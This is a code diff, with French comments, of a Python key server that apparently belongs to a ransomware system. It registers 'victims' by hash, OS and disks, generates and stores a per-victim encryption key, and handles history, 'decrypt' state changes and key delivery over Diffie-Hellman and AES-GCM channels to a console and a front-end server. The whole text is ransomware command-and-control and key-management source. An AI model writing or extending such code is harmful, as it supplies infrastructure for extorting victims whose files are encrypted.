@@ -26,11 +26,11 @@ def main():
     q_response_frontal = queue.Queue()  # Queue FIFO pour renvoyer les réponses vers le serveur frontal
 
     # Démarrage du Thread de communication avec la console de contrôle
-    t_console = Thread(target=thread_console, args=(q_request, q_response_console,), daemon=True)
+    t_console = Thread(target=thread_console, args=(q_request, q_response_console), daemon=True)
     t_console.start()
 
     # Démarrage du Thread de communication avec le serveur frontal
-    t_frontal = Thread(target=thread_frontal, args=(q_request, q_response_frontal,), daemon=True)
+    t_frontal = Thread(target=thread_frontal, args=(q_request, q_response_frontal), daemon=True)
     t_frontal.start()
 
     while True:
@@ -54,13 +54,11 @@ def main():
                 # Envoi du message list_victime_end
             msg = utile.message.set_message('list_victim_end')
             # Envoi du msg sur la queue q_response_console
-            if DEBUG_MODE:
-                print(f"Put msg {msg}")
             q_response_console.put(msg)
             q_response_console.join()
             q_request.task_done()
-        # Si le message reçu est un history_req
-        elif msg_type == 'HISTORY_REQ':
+
+        if msg_type == 'HISTORY_REQ':
             id_victim = msg['HIST_REQ']
             histories = data.get_list_history(conn_db, id_victim)
             for history in histories:
@@ -80,22 +78,18 @@ def main():
             q_response_console.put(msg)
             q_response_console.join()
             q_request.task_done()
-        # Si le message reçu est un change_state
-        elif msg_type == 'CHANGE_STATE':
+
+        if msg_type == 'CHANGE_STATE':
             id_victim = msg['CHGSTATE']
             # ==== FONCTION change_state_decrypt(id_victime) à produire ====
             data.change_state_decrypt(conn_db, id_victim)
             q_request.task_done()
 
-        # Si le message reçu est un initalize_req
-        elif msg_type == 'INITIALIZE_REQ':
-            # Check si HASH existe déjà en DB
-            victim = data.check_hash(conn_db, msg['INITIALIZE'])  # Retourne l'id_victim + key_victim + last_state
-            if victim is None:
-                key_victim = generate_key(512)
-                # Enregistrement en DB de la nouvelle victime
-                id_victim = data.new_victim(conn_db, msg['INITIALIZE'], msg['OS'], msg['DISKS'], key_victim)
-                victim = [id_victim, key_victim, 'INITIALIZE']
+        if msg_type == 'INITIALIZE_REQ':
+            key_victim = generate_key(512)
+            # Enregistrement en DB de la nouvelle victime
+            id_victim = data.new_victim(conn_db, msg['INITIALIZE'], msg['OS'], msg['DISKS'], key_victim)
+            victim = [id_victim, key_victim, 'INITIALIZE']
             # Envoie du initialize_key
             msg = utile.message.set_message('initialize_key', victim)
             # Envoi du msg sur la queue q_response_console
@@ -116,9 +110,8 @@ def thread_console(q_request, q_response_console):
 
         # Insérer le traitement des données ici
         while True:
-            aes_key = security.gen_key()
+            aes_key = security.diffie_hellman_send_key(s_console)
             print(f"Clé de chiffrement : {aes_key} {type(aes_key)}")
-            network.send_message(s_console, aes_key)
             # Recevoir le message du client
             message = network.receive_message(s_console)
             print(message)
@@ -184,34 +177,21 @@ def thread_frontal(q_request, q_response_frontal):
         print(f"[Serveur de clés] : Connexion du serveur frontal {address_frontal} a été établie.")
 
         # Envoi la clé de chiffrement lors de la connexion via Diffie Hellman Send Key
-
         aes_key = security.diffie_hellman_send_key(s_frontal)
         print(f"Clé de chiffrement : {aes_key} {type(aes_key)}")
-
-        # Envoi la clé de chiffrement lors de la connexion sans sécurisation des échanges
-        #if AES_GCM:
-        #    aes_key = security.gen_key()
-        #    if DEBUG_MODE:
-        #        print(f"Clé de chiffrement : {aes_key} {type(aes_key)}")
-        #    network.send_message(s_console, aes_key)
         while True:
             # Réception du premier message
             msg = network.receive_message(s_frontal)
-            if not msg:     # La connexion a été fermée
-                break
-            if AES_GCM:
-                msg = security.aes_decrypt(msg, aes_key)
+            msg = security.aes_decrypt(msg, aes_key)
             msg_type = utile.message.get_message_type(msg)
             # Si le message reçu est un initialize_req
             if msg_type == 'INITIALIZE_REQ':
-                q_request.put(msg)      # Envoie la requête dans la queue q_request
+                q_request.put(msg)  # Envoie la requête dans la queue q_request
                 msg = q_response_frontal.get()
-                if DEBUG_MODE:
-                    print(f"Get msg {msg}")
+                print(f"Get msg {msg}")
                 msg_type = utile.message.get_message_type(msg)
-                if msg_type == 'INITIALIZE_KEY':       # Envoie de la clé de chiffrement
-                    if AES_GCM:
-                        msg = security.aes_encrypt(msg, aes_key)
+                if msg_type == 'INITIALIZE_KEY':  # Envoie de la clé de chiffrement
+                    msg = security.aes_encrypt(msg, aes_key)
                     network.send_message(s_frontal, msg)
                     q_response_frontal.task_done()
 
